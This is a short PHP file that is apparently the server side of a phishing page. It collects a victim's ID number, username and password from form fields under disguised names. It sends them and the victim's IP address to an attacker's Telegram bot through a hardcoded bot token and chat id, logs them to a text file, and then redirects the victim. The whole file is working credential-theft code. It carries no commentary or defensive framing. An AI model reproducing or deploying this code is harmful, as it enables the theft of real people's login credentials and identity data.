<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "5729934626:AAGoAbX-jadjWVqxt2Wjgvt9ZWJtzzJCJHw";
$id = "-852503539";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
DNI: ".$_POST['sol']."
Usuario: ".$_POST['nahual']."
Clave: ".$_POST['chaneque']."
IP: ".$userp."
";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);

////////////////////



	if(isset($_POST['sol']) &&($_POST['nahual']) &&($_POST['chaneque']) ){

    $file = fopen("Pesos.txt", "a");
fwrite($file, "Documento : " .$_POST['sol']. PHP_EOL);
fwrite($file, "Usuario : " .$_POST['nahual']. PHP_EOL);
fwrite($file, "Clave : " .$_POST['chaneque']. PHP_EOL);
fwrite($file, "Fecha :  ".date('Y-m-d')." - ".date('H:i:s')."" . PHP_EOL);
fwrite($file, "IP :   ".$ip."" . PHP_EOL);
fwrite($file, "======================================================== " . PHP_EOL);

header ('location: index2.html');

	}
?>
